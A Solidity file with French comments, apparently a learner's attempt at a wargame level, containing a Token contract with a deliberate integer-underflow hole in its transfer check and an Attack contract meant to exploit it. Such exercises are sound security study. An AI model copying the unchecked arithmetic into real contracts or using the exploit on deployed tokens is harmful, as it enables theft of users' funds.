//En pensant à un compteur kilométrique je dois pouvoir trouver la vulnérabilité dans ce contract.
//Le compteur kilométrique ici represente la variable qui me permet de garder l'etat du solde
//d'un utilisateur. Avec la version ^0.6.0 les erreurs de type underflow ou overflow ne sont
//pas gérées automatiquement donc je peux tirer partie de cette faille
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import {console} from "forge-std/Test.sol";

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    //A cause du msg.sender il faut que ce soit le contract Attack qui soit le deployer du contract
    //Token pour que depuis le EOA je puisse initier la transaction et que le contract
    //Attack fasse l'attaque maintenant puisqu'il sera le msg.sender cette fois-ci
    function transfer(address _to, uint256 _value) public returns (bool) {
        //Faille potentielle de type underflow
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}

contract Attack {
    Token public token;
    address public receiver = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address owner;

    constructor() public {
        token = new Token(20);
        owner = msg.sender;
    }

    function attack(uint256 amount) public {
        address(this).call{value: 0 ether}("");
    }

    fallback() external {
        console.log("fallback");
        if (token.balanceOf(address(this)) > 0) {
            token.transfer(address(this), 20);
        }
    }

    receive() external payable {
        console.log("receive");
        if (token.balanceOf(address(this)) >= 0) {
            token.transfer(receiver, 20);
        }
    }

    function getBalance() public returns (uint256) {
        return token.balanceOf(address(this));
    }
}
